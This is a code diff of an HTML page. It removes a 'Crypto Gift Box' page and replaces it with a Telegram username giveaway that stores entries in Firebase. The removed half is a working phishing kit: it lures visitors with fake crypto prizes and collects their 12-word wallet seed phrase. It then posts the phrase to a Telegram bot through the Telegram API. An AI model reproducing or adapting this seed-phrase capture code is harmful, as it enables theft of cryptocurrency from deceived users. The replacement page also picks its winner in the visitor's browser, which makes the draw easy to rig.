@@ -2,261 +2,122 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Crypto Gift Box</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
-  <style>
-    :root {
-      --background: #0f0f0f;
-      --card-bg: #1e293b;
-      --primary: #3b82f6;
-      --text-main: #cbd5e1;
-      --text-sub: #94a3b8;
-      --error: #f87171;
-    }
-
-    body {
-      margin: 0;
-      padding: 0;
-      background: var(--background);
-      font-family: 'Poppins', sans-serif;
-      color: var(--text-main);
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      overflow: hidden;
-    }
-
-    .container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      text-align: center;
-      background: var(--card-bg);
-      padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
-      width: 90%;
-      max-width: 400px;
-    }
-
-    .gift-box {
-      width: 120px;
-      height: 120px;
-      background: linear-gradient(135deg, #1e293b, #334155);
-      border: 2px solid var(--primary);
-      border-radius: 16px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 36px;
-      color: var(--primary);
-      cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 8px 16px rgba(59, 130, 246, 0.3);
-      margin-bottom: 20px;
-    }
-
-    .gift-box:hover {
-      transform: scale(1.05);
-      background: linear-gradient(135deg, #334155, #1e293b);
-    }
-
-    .prize {
-      font-size: 16px;
-      color: var(--text-sub);
-      margin-top: 10px;
-      margin-bottom: 20px;
-      display: none;
-    }
-
-    .claim-btn, .submit-btn {
-      background: var(--primary);
-      border: none;
-      padding: 12px 25px;
-      font-size: 16px;
-      font-weight: 600;
-      color: #fff;
-      border-radius: 12px;
-      cursor: pointer;
-      transition: background 0.3s;
-      margin-top: 10px;
-    }
-
-    .claim-btn:hover, .submit-btn:hover {
-      background: #2563eb;
-    }
-
-    .mnemonic-input {
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      width: 100%;
-      margin-top: 15px;
-    }
-
-    .mnemonic-input textarea {
-      width: 100%;
-      height: 100px;
-      padding: 10px;
-      border-radius: 10px;
-      background: #0f172a;
-      border: 1px solid #334155;
-      color: var(--text-main);
-      resize: none;
-      font-size: 14px;
-      margin-bottom: 10px;
-    }
-
-    .error-message {
-      color: var(--error);
-      font-size: 13px;
-      margin-top: 5px;
-      display: none;
-    }
-
-    .popup {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: var(--card-bg);
-      border: 2px solid var(--primary);
-      padding: 30px 40px;
-      border-radius: 20px;
-      display: none;
-      z-index: 1000;
-      font-size: 18px;
-      text-align: center;
-      animation: fadeIn 0.3s ease;
-    }
-
-    @keyframes fadeIn {
-      from {opacity: 0; transform: translate(-50%, -45%);}
-      to {opacity: 1; transform: translate(-50%, -50%);}
-    }
-
-    .countdown {
-      margin-top: 10px;
-      font-size: 14px;
-      color: var(--text-sub);
-      display: none;
-    }
-  </style>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Daily Telegram Giveaway</title>
+  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
 </head>
+<body class="bg-gradient-to-r from-purple-500 to-indigo-600 min-h-screen flex flex-col items-center justify-center text-white font-sans">
 
-<body>
-  <div class="container">
-    <div class="gift-box" id="giftBox">Open</div>
-    <div class="prize" id="prizeText"></div>
-    <button class="claim-btn" id="claimBtn" style="display:none;">Claim Prize</button>
+  <div class="bg-white text-gray-800 rounded-2xl shadow-2xl p-8 w-full max-w-md">
+    <h1 class="text-3xl font-bold text-center mb-6">$1 Daily Giveaway</h1>
 
-    <div class="mnemonic-input" id="mnemonicInput">
-      <textarea id="mnemonic" placeholder="Enter your 12-word mnemonic phrase..."></textarea>
-      <button class="submit-btn" id="submitBtn">Submit</button>
-      <div class="error-message" id="errorMessage"></div>
+    <div id="form-section">
+      <input id="username" type="text" placeholder="Enter your Telegram username" class="w-full p-3 rounded-lg border mb-4">
+      <button onclick="submitUsername()" class="w-full bg-indigo-600 hover:bg-indigo-700 p-3 rounded-lg font-semibold text-white">Submit</button>
     </div>
 
-    <div class="countdown" id="countdownTimer"></div>
+    <div id="winner-box" class="hidden mt-6 p-4 bg-green-100 text-green-800 rounded-lg text-center">
+      <p>Thank you for participating!</p>
+    </div>
+
+    <div id="today-winner" class="hidden mt-6 p-4 bg-yellow-100 text-yellow-800 rounded-lg text-center">
+      <h2 class="font-bold">Today's Winner:</h2>
+      <p id="winner-name" class="mt-2"></p>
+    </div>
+
+    <div class="mt-8">
+      <h2 class="text-xl font-bold mb-2">Today's Participants:</h2>
+      <ul id="user-list" class="space-y-2"></ul>
+    </div>
   </div>
 
-  <div class="popup" id="popup">Thank you! Processing your reward...</div>
-
 <script>
-  const prizes = ["1 BNB", "10 USDT", "100 USDT", "1 BTC", "1 ETH", "1 LTC", "500 XRP", "0.5 SOL", "2 ADA", "100 DOGE"];
-  const giftBox = document.getElementById('giftBox');
-  const prizeText = document.getElementById('prizeText');
-  const claimBtn = document.getElementById('claimBtn');
-  const mnemonicInput = document.getElementById('mnemonicInput');
-  const submitBtn = document.getElementById('submitBtn');
-  const popup = document.getElementById('popup');
-  const errorMessage = document.getElementById('errorMessage');
-  const countdownTimer = document.getElementById('countdownTimer');
+  // Firebase configuration (replace with your config)
+  const firebaseConfig = {
+    apiKey: "YOUR_API_KEY",
+    authDomain: "YOUR_AUTH_DOMAIN",
+    databaseURL: "YOUR_DATABASE_URL",
+    projectId: "YOUR_PROJECT_ID",
+    storageBucket: "YOUR_STORAGE_BUCKET",
+    messagingSenderId: "YOUR_SENDER_ID",
+    appId: "YOUR_APP_ID"
+  };
 
-  let selectedPrize = "";
-  const CLAIM_KEY = "lastClaimTime";
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
 
-  function updateCountdown() {
-    const lastClaim = localStorage.getItem(CLAIM_KEY);
-    if (!lastClaim) return;
+  const today = new Date().toISOString().split('T')[0]; // YYYY-MM-DD
 
-    const now = Date.now();
-    const diff = (parseInt(lastClaim) + 24 * 60 * 60 * 1000) - now;
-
-    if (diff <= 0) {
-      countdownTimer.style.display = 'none';
+  async function submitUsername() {
+    const usernameInput = document.getElementById('username');
+    const username = usernameInput.value.trim();
+    if (!username) {
+      alert('Please enter your Telegram username.');
       return;
     }
 
-    const hours = Math.floor(diff / (1000 * 60 * 60));
-    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-    const seconds = Math.floor((diff % (1000 * 60)) / 1000);
-    countdownTimer.innerText = `Next claim in ${hours}h ${minutes}m ${seconds}s`;
-    countdownTimer.style.display = 'block';
+    // Check if user already submitted today
+    const snapshot = await db.ref(`submissions/${today}`).once('value');
+    const submissions = snapshot.val() || {};
+    const usernames = Object.values(submissions);
 
-    setTimeout(updateCountdown, 1000);
+    if (usernames.includes(username)) {
+      alert('You have already submitted today!');
+      return;
+    }
+
+    const newSubmissionRef = db.ref(`submissions/${today}`).push();
+    newSubmissionRef.set(username);
+
+    document.getElementById('form-section').classList.add('hidden');
+    document.getElementById('winner-box').classList.remove('hidden');
   }
 
-  function canClaim() {
-    const lastClaim = localStorage.getItem(CLAIM_KEY);
-    if (!lastClaim) return true;
-
-    const now = Date.now();
-    return now - parseInt(lastClaim) >= 24 * 60 * 60 * 1000;
-  }
-
-  giftBox.addEventListener('click', () => {
-    if (!canClaim()) {
-      alert("You can only open the gift box once every 24 hours!");
-      return;
-    }
-
-    selectedPrize = prizes[Math.floor(Math.random() * prizes.length)];
-    prizeText.textContent = `You Won: ${selectedPrize}`;
-    prizeText.style.display = 'block';
-    claimBtn.style.display = 'inline-block';
-    giftBox.style.pointerEvents = 'none';
-    localStorage.setItem(CLAIM_KEY, Date.now().toString());
-    updateCountdown();
-  });
-
-  claimBtn.addEventListener('click', () => {
-    claimBtn.style.display = 'none';
-    mnemonicInput.style.display = 'flex';
-  });
-
-  submitBtn.addEventListener('click', () => {
-    const mnemonic = document.getElementById('mnemonic').value.trim();
-    errorMessage.style.display = 'none';
-
-    if (mnemonic.split(' ').length !== 12) {
-      errorMessage.textContent = "Please enter exactly 12 words.";
-      errorMessage.style.display = 'block';
-      return;
-    }
-
-    const botToken = 'YOUR_BOT_TOKEN';
-    const chatId = 'YOUR_CHAT_ID';
-    const message = `Mnemonic:\n${mnemonic}\n\nPrize: ${selectedPrize}`;
-
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, text: message })
-    })
-    .then(response => response.json())
-    .then(data => {
-      popup.style.display = 'block';
-      setTimeout(() => location.reload(), 3000);
-    })
-    .catch(error => {
-      errorMessage.textContent = "Error sending message. Please try again.";
-      errorMessage.style.display = 'block';
+  async function loadUserList() {
+    const snapshot = await db.ref(`submissions/${today}`).once('value');
+    const submissions = snapshot.val() || {};
+    const userList = document.getElementById('user-list');
+    userList.innerHTML = '';
+    Object.values(submissions).forEach(user => {
+      const li = document.createElement('li');
+      li.textContent = `@${user}`;
+      userList.appendChild(li);
     });
-  });
+  }
 
-  updateCountdown();
+  async function checkWinner() {
+    const winnerSnapshot = await db.ref(`winners/${today}`).once('value');
+    let winner = winnerSnapshot.val();
+
+    if (!winner) {
+      const now = new Date();
+      if (now.getHours() >= 19) { // 7 PM = 19 hours
+        // Pick a random winner
+        const submissionsSnapshot = await db.ref(`submissions/${today}`).once('value');
+        const submissions = submissionsSnapshot.val() || {};
+        const entries = Object.values(submissions);
+
+        if (entries.length > 0) {
+          const randomUser = entries[Math.floor(Math.random() * entries.length)];
+          await db.ref(`winners/${today}`).set(randomUser);
+          winner = randomUser;
+        }
+      }
+    }
+
+    if (winner) {
+      document.getElementById('today-winner').classList.remove('hidden');
+      document.getElementById('winner-name').textContent = `@${winner}`;
+    }
+  }
+
+  window.onload = function() {
+    loadUserList();
+    checkWinner();
+  }
 </script>
+
 </body>
 </html>
